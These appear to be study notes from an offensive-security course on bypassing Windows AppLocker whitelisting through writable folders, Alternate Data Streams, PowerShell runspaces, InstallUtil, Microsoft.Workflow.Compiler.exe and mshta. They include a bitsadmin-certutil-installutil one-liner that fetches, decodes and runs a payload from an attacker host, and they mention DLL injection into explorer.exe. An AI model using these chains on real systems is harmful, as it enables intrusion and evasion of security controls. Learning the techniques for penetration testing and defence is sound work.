## Application Whitelisting Theory
 Application whitelisting software uses a custom driver to register a callback function through this PsSetCreateProcessNotifyRoutineEx API. The callback is invoked every time a new process is created and detemine whether or not an application is whitelisted. Microsoft has multiple native application whitelisting soultions.  AppLocker was introduced in Win7 and avaiable in Win10.
 
 AppLocker includes kernel-mode driver APPID.SYS and the APPIDSVC user-mode service. APPIDSVC manages the whitelisting ruleset and identifies applications when they are run based on the callback notifications from APPID.SYS.
 
 AppLocker has 3 rule categories:
 - 1.Based on FilePath
 - 2.Based on file hash(SHA256)
 - 3.Based on digital signature

 You can access AppLocker in command prompt -> gpedit.msc(GPO configuration manager)->Local Computer Policy -> Computer
Configuration -> Windows Settings -> Security Settings -> Application Control Policies->AppLocker. There will be 4 rule propertites for 4 separate file types
- 1 .exe executable files
- 2 .msi Windows Installer files
- 3 .powershell , jscript, VB, .cmd and .bat native script files
- 4 Packaged Apps from Microsoft App Store
 
 Group Policy, AppLocker violation can be review in Windows event log. eventvwr->Applications and Services Logs -> Microsoft -> Windows -> AppLocker
 
 ## Basic Bypasses
- 1.Check permission for default rules for AppLocker whitelist all executables and scripts located in C:\Program Files, C:\Program Files (x86), and C:\Windows
- 2.Identify writable floder by a user using [accesschk.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk). -u supress error, -w writable directories, -s recurese search.
```
C:\users\mst>accesschk.exe "mst" C:\Windows -wus
```
icacls can tell is a folder path is executable 
```
C:\users\mst>icacls.exe C:\Windows\Tasks
C:\Windows\Tasks NT AUTHORITY\Authenticated Users:(RX,WD)
```
- 3.The default ruleset doesn’t protect against loading arbitrary DLLs. If we were to create an unmanaged DLL, we would be able to load it and trigger exported APIs to gain
arbitrary code execution.
- 4.Alternate Date Steams is a binary file attribute that contains metadata. We can append binary data if additional streams to the original file. If we can find a file that a current user can write and execute. The below code append test.js to a log file. And we can execute it.
```
C:\Users\mst>type test.js > "C:\Program Files(x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"

C:\Users\mst>wscript "C:\Program Files(x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
```
- 5.Third Party Execution. If a third-party scripting engine like Python or Perl is installed, we could use it to very easily bypass application whitelisting.
```
C:\Users\mst>python test.py
```
## Bypass AppLocker with Powershell
Powershell Language Mode: 
- 1.FullLanguage, allows all cmdlets and the entire .NET framework as well as C# code execution.
- 2.RestrictedLanguage, allowing default cmdlets but heavily restricting much else
- 3.NoLanguage disallows all script text

ConstrainedLanguage mode (CLM) with PowerShell version 3.0, allow scripts that are located in whitelisted locations or otherwise comply with a whitelisting rule can execute with full functionality. The most significant limiation excludes calls to the .NET framework, execution of C# code and reflection.

```
PS C:\Users\mst> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
```
#### Bypass Constrained language mode(CLM) with custom runsapces
Powershell call **System.Management.Automation.dll** to create runspace. This measns, we can write c# [powershellrunnerSpace.cs](/06ApplicationWhitelistingBypass/powershellrunnerSpace.cs) to creates a custom PowerShell runsapce and executes our script inside it. 

The above bypass the powershell execution, but if the AppBlocker pervent custom c# execution, our TTPs will not work. We can leverage native Windows application **InstallUtil**.
This command allows us to install and uninstall server resources by executing the installer components in a specified assembly. We are going to user uninstall method because install method reuqired admin privileges.

We can write [installer.cs](/06ApplicationWhitelistingBypass/Installer.cs) script and compile to our bypass.exe. Once compiled, we can use native windows commands to transfer our file from attack machine to target machine and exuecte it with InstallUtil command.

First, we can encode our exe on our attack machine, host the encoded file

```
C:\Users\mst>certutil -encode C:\Users\mst\Bypass.exe file.txt
```

Second trafer the file to target, decode and execute, and remove encoded file
```
C:\Users\target>bitsadmin /Transfer myJob http://yourip/file.txt C:\users\target\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\target\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= LogToConsole=false /U C:\users\target\Bypass.exe
```
Now we have a bypass method, we will update our Installer.cs to [InsallerShell.cs](/06ApplicationWhitelistingBypass/InstallerShell.cs) which use [Invoke-ReflectivePEInjection PowerShell](/03ProcessInjectionMigration/Invoke-ReflectivePEInjection.ps1) to inject a dll into explorer.exe

## Bypass AppLocker with C# via whitelisted application
The ultimate goal is to execute arbitrary C# code via a whitelisted application. It means target application must either accept a pre-compiled executable as an argument and load it into memory or compile it itself. The application must load unsigned managed code into memory. This is typically done through APIs like Load,457 LoadFile458 or LoadFrom.

- 1.We must reverse enginner assemblies which reside in whitelisted locations in search of the code segments that either load precompiled managed code or use source code
which is compiled as part of the processing.
- 2.We will use [dnSpy](https://github.com/dnSpy/dnSpy.git) to reverse engineering System.Workflow.ComponentModel.dll located in C:\Windows\Microsoft.NET\Framework64\v4.0.30319
- 3.We will follow security researcher Matt Graeber's [rbitrary, Unsigned Code Execution Vector in Microsoft.Workflow.Compiler.exe](https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb) blog for reverse engineering.
- 4.In summary, we must craft a file containing C# [Compilerbypass.cs](/06ApplicationWhitelistingBypass/Compilerbypass.cs) code, which implements a class that inherits from the Activity class and has a constructor. The file path must be inserted into the XML document along with compiler parameters organized in a serialized format using [Convertoxml.ps1](/06ApplicationWhitelistingBypass/Convertoxml.ps1) script. 
- 5.run the executable with the two input arguments, the second argument can be anything, the first argument is the output from Convertoxml.ps1 script

```
C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml results.xml
```
## Bypass AppLocker with JScript

Microsoft HTML Applications (MSHTA) excute .hta files with native mshta.exe. Since mshta.exe is located in C:\Windows\System32 and is a signed Microsoft application, it is
commonly whitelisted. We can execute our Jscript code with mshta.exe instead of wscript.exe to bypass application whitelisting. This is an [example Jscript code](/06ApplicationWhitelistingBypass/hiddentJscript.hta) embedded inside of HTA file.

